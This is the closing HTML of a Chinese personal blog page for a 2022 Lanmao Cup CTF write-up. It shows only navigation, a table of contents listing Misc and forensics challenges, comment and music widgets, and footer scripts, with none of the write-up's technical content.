rel="external nofollow noopener noreferrer noopener" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://sxyugao.top/p/533ccbb.html&title=蓝帽杯 2022 Writeup | YuGao's Blog&summary=7月底划水打了蓝帽杯，然后一直没写 wp 鸽到现在，感觉整个暑假啥也没干，应该写点啥。"><img src="/images/qq.png"> </a><a class="-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer noopener" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://sxyugao.top/p/533ccbb.html&title=蓝帽杯 2022 Writeup | YuGao's Blog&summary=7月底划水打了蓝帽杯，然后一直没写 wp 鸽到现在，感觉整个暑假啥也没干，应该写点啥。"><img src="/images/qzone.png"> </a><a class="-share-sina" title="微博" rel="external nofollow noopener noreferrer"><img src="/images/sina.png"></a></div></div></section><div class="prev-next"><section class="prev"><span class="art-item-left"><h6><i class="fas fa-chevron-left" aria-hidden="true"></i> &nbsp;上一页</h6><h4><a href="/p/146f06a.html" rel="prev" title="HWS第六期2023冬令营选拔赛 Writeup">HWS第六期2023冬令营选拔赛 Writeup</a></h4></span></section><section class="next"><span class="art-item-right" aria-hidden="true"><h6>下一页&nbsp; <i class="fas fa-chevron-right" aria-hidden="true"></i></h6><h4><a href="/p/a1789b58.html" rel="prev" title="在CTF中常用到的PHP函数">在CTF中常用到的PHP函数</a></h4></span></section></div></section></article><br><article class="card-shadow blur post comments"><section class="article typo"><section id="comments"><div id="valine_container" class="valine_thread"><i class="fas fa-spinner fa-spin fa-fw"></i></div></section></section></article><script>window.subData={title:"蓝帽杯 2022 Writeup",tools:!0}</script><script>new Valine({el:"#valine_container",verify:!0,notify:!1,appId:"WA9s4PHugzzfhkfjvuyMuxon-gzGzoHsz",appKey:"6ueAjf6IMWsyoRLCwduNmLzT",pageSize:5,placeholder:"ヾﾉ≧∀≦)o 来啊！快活啊！",visitor:!0,recordIP:!1,serverURLs:"https://wa9s4phu.lc-cn-n1-shared.com",path:window.location.pathname})</script></div><aside class="l_side"><section class="card-shadow blur widget author"><div class="content"><div class="avatar"><img class="avatar" src="https://cdn.jsdelivr.net/gh/sxyugao/Website/images/avatar.png"></div><div class="social-wrapper"><a href="/rss.xml" class="social" target="_blank" rel="external"><i class="social fas fa-rss" aria-hidden="true"></i> </a><a href="mailto:sxyugao@qq.com" class="social" target="_blank" rel="external"><i class="social fas fa-envelope" aria-hidden="true"></i> </a><a href="https://wpa.qq.com/msgrd?v=3&uin=2645943187&site=qq&menu=yes" class="social" target="_blank" rel="external"><i class="social fab fa-qq" aria-hidden="true"></i> </a><a href="https://github.com/sxyugao" class="social" target="_blank" rel="external"><i class="social fab fa-github" aria-hidden="true"></i> </a><a href="https://music.163.com/#/user/home?id=536677549" class="social" target="_blank" rel="external"><i class="social fas fa-headphones-alt" aria-hidden="true"></i></a></div></div></section><section class="card-shadow blur widget hitokoto"><header><div><i class="fa fa-quote-left fa-fw" aria-hidden="true"></i>&nbsp;&nbsp; 一言（ヒトコト）</div></header><div class="content"><p style="text-align:center" id="hitokoto-content"></p><p style="text-align:right;margin-top:15px" id="hitokoto-from"></p></div></section><section class="card-shadow blur widget category"><header><div><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>&nbsp;&nbsp; 所有分类</div></header><div class="content"><ul class="entry"><li><a class="flat-box" title="/categories/CTF/" href="/categories/CTF/"><div class="name">CTF</div><div class="badge">(14)</div></a></li><li><a class="flat-box child" title="/categories/CTF/HGAME/" href="/categories/CTF/HGAME/"><div class="name">HGAME</div><div class="badge">(2)</div></a></li><li><a class="flat-box child" title="/categories/CTF/HWS/" href="/categories/CTF/HWS/"><div class="name">HWS</div><div class="badge">(2)</div></a></li><li><a class="flat-box child" title="/categories/CTF/Hackergame/" href="/categories/CTF/Hackergame/"><div class="name">Hackergame</div><div class="badge">(1)</div></a></li><li><a class="flat-box child" title="/categories/CTF/N1BOOK/" href="/categories/CTF/N1BOOK/"><div class="name">N1BOOK</div><div class="badge">(1)</div></a></li><li><a class="flat-box child" title="/categories/CTF/Web/" href="/categories/CTF/Web/"><div class="name">Web</div><div class="badge">(7)</div></a></li><li><a class="flat-box child" title="/categories/CTF/%E8%93%9D%E5%B8%BD%E6%9D%AF/" href="/categories/CTF/%E8%93%9D%E5%B8%BD%E6%9D%AF/"><div class="name">蓝帽杯</div><div class="badge">(1)</div></a></li><li><a class="flat-box" title="/categories/OI/" href="/categories/OI/"><div class="name">OI</div><div class="badge">(12)</div></a></li><li><a class="flat-box child" title="/categories/OI/CodeForces/" href="/categories/OI/CodeForces/"><div class="name">CodeForces</div><div class="badge">(3)</div></a></li><li><a class="flat-box child" title="/categories/OI/%E6%B4%9B%E8%B0%B7/" href="/categories/OI/%E6%B4%9B%E8%B0%B7/"><div class="name">洛谷</div><div class="badge">(9)</div></a></li><li><a class="flat-box" title="/categories/%E5%85%B6%E4%BB%96/" href="/categories/%E5%85%B6%E4%BB%96/"><div class="name">其他</div><div class="badge">(1)</div></a></li><li><a class="flat-box" title="/categories/%E6%9E%81%E5%AE%A2/" href="/categories/%E6%9E%81%E5%AE%A2/"><div class="name">极客</div><div class="badge">(9)</div></a></li><li><a class="flat-box child" title="/categories/%E6%9E%81%E5%AE%A2/Linux/" href="/categories/%E6%9E%81%E5%AE%A2/Linux/"><div class="name">Linux</div><div class="badge">(2)</div></a></li><li><a class="flat-box child" title="/categories/%E6%9E%81%E5%AE%A2/Windows/" href="/categories/%E6%9E%81%E5%AE%A2/Windows/"><div class="name">Windows</div><div class="badge">(3)</div></a></li><li><a class="flat-box child" title="/categories/%E6%9E%81%E5%AE%A2/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" href="/categories/%E6%9E%81%E5%AE%A2/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><div class="name">环境配置</div><div class="badge">(2)</div></a></li><li><a class="flat-box" title="/categories/%E8%BD%AC%E8%BD%BD/" href="/categories/%E8%BD%AC%E8%BD%BD/"><div class="name">转载</div><div class="badge">(1)</div></a></li></ul></div></section><section class="card-shadow blur widget tagcloud"><header><div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp; 热门标签</div></header><div class="content"><a href="/tags/BFS/" style="font-size:16.5px;color:#888">BFS</a> <a href="/tags/DP/" style="font-size:19px;color:#777">DP</a> <a href="/tags/HGAME/" style="font-size:16.5px;color:#888">HGAME</a> <a href="/tags/HWS/" style="font-size:16.5px;color:#888">HWS</a> <a href="/tags/Hackergame/" style="font-size:14px;color:#999">Hackergame</a> <a href="/tags/Linux/" style="font-size:16.5px;color:#888">Linux</a> <a href="/tags/N1BOOK/" style="font-size:14px;color:#999">N1BOOK</a> <a href="/tags/PHP/" style="font-size:19px;color:#777">PHP</a> <a href="/tags/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" style="font-size:14px;color:#999">PHP伪协议</a> <a href="/tags/PowerShell/" style="font-size:14px;color:#999">PowerShell</a> <a href="/tags/SQLi/" style="font-size:16.5px;color:#888">SQLi</a> <a href="/tags/STL/" style="font-size:21.5px;color:#666">STL</a> <a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size:14px;color:#999">其他</a> <a href="/tags/%E5%9B%BE%E8%AE%BA/" style="font-size:14px;color:#999">图论</a> <a href="/tags/%E6%8E%92%E5%BA%8F/" style="font-size:14px;color:#999">排序</a> <a href="/tags/%E6%95%B0%E5%AD%A6/" style="font-size:16.5px;color:#888">数学</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:14px;color:#999">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size:14px;color:#999">文件包含</a> <a href="/tags/%E6%9E%9A%E4%B8%BE/" style="font-size:14px;color:#999">枚举</a> <a href="/tags/%E6%A0%91%E4%B8%8A%E9%97%AE%E9%A2%98/" style="font-size:16.5px;color:#888">树上问题</a> <a href="/tags/%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/" style="font-size:14px;color:#999">树链剖分</a> <a href="/tags/%E6%A6%82%E7%8E%87%E6%9C%9F%E6%9C%9B/" style="font-size:14px;color:#999">概率期望</a> <a href="/tags/%E7%BA%BF%E6%AE%B5%E6%A0%91/" style="font-size:14px;color:#999">线段树</a> <a href="/tags/%E8%93%9D%E5%B8%BD%E6%9D%AF/" style="font-size:14px;color:#999">蓝帽杯</a> <a href="/tags/%E8%B4%AA%E5%BF%83/" style="font-size:16.5px;color:#888">贪心</a> <a href="/tags/%E8%BD%AF%E4%BB%B6/" style="font-size:24px;color:#555">软件</a></div></section><section class="card-shadow blur widget toc-wrapper"><header><div><i class="fas fa-list fa-fw" aria-hidden="true"></i>&nbsp;&nbsp; 文章目录</div><div class="wrapper"><a class="s-toc rightBtn" rel="external nofollow noopener noreferrer" href="javascript:void(0)"><i class="fas fa-thumbtack fa-fw"></i></a></div></header><div class="content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#domainhacker"><span class="toc-text">domainhacker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#domainhacker2"><span class="toc-text">domainhacker2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81"><span class="toc-text">电子取证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%9C%BA%E5%8F%96%E8%AF%81"><span class="toc-text">手机取证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81-1"><span class="toc-text">计算机取证_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%8F%96%E8%AF%81-2"><span class="toc-text">计算机取证_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-1"><span class="toc-text">网站取证_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-2"><span class="toc-text">网站取证_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-3"><span class="toc-text">网站取证_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-4"><span class="toc-text">网站取证_4</span></a></li></ol></li></ol></div></section></aside><script>NProgress.inc(.6)</script></div></div><div id="live2d-container"><canvas id="live2d" width="165" height="350" style="pointer-events:none"></canvas></div><footer id="footer" class="clearfix"><div><i class="fa fa-copyright">&nbsp;2018 - 2024</i> <span style="font-weight:700">&nbsp;&nbsp;|&nbsp;&nbsp;</span> <i class="fa fa-heart">&nbsp;&nbsp;sxyugao</i></div><div class="social-wrapper"><a href="/rss.xml" class="social fas fa-rss" target="_blank" rel="external"></a> <a href="mailto:sxyugao@qq.com" class="social fas fa-envelope" target="_blank" rel="external"></a> <a href="https://wpa.qq.com/msgrd?v=3&amp;uin=2645943187&amp;site=qq&amp;menu=yes" class="social fab fa-qq" target="_blank" rel="external"></a> <a href="https://github.com/sxyugao" class="social fab fa-github" target="_blank" rel="external"></a> <a href="https://music.163.com/#/user/home?id=536677549" class="social fas fa-headphones-alt" target="_blank" rel="external"></a></div><span>本站已经元气满满地运行了</span><span id="htmer_time"></span> <i class="fa fa-heart heart"></i><div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p></div></footer><script>NProgress.inc(.7)</script><script>function isMobile(){let i=navigator.userAgent,n=["Android","iPhone","SymbianOS","Windows Phone","iPod","iPad"];for(let e of n)if(i.indexOf(e)>=0)return!0;return!1}</script><link href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css" rel="stylesheet"><script defer="defer" src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script><script type="text/javascript">$((function(){Waves.attach(".flat-box",["waves-block"]),Waves.init()}))</script><script src="https://cdn.jsdelivr.net/gh/sxyugao/Website/js/live2d.js"></script><script>isMobile()||L2Dwidget.init({model:{jsonPath:"https://cdn.jsdelivr.net/gh/sxyugao/Website/live2d/assets/koharu.model.json"}})</script><link href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" rel="stylesheet"><script defer="defer" src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script defer="defer" src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script><script>if(!isMobile()){let e='<meting-js theme="#3273dc" fixed=true autoplay="false" server="netease" type="playlist" id="7263710447" volume="0.7"></meting-js>';$("#live2d-container").before(e);let t=setInterval((()=>{let e=document.querySelector("meting-js").aplayer;e&&(e.lrc.hide(),clearInterval(t))}),100)}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"><link href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" rel="stylesheet"><script defer="defer" src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script id="ribbon" src="https://cdn.jsdelivr.net/gh/sxyugao/Website/js/canvas-ribbon.js"></script><script src="https://cdn.jsdelivr.net/gh/sxyugao/Website/js/search.js"></script><script src="/js/app.js"></script><script>$(document).ready((()=>{reset(),NProgress.done()}))</script><script type="text/javascript">$(document).pjax("a","#pjax-container",{fragment:"#pjax-container",timeout:5e3}).on("pjax:start",(()=>{NProgress.start()})).on("pjax:complete",(()=>{reset(),NProgress.done()}))</script></body></html>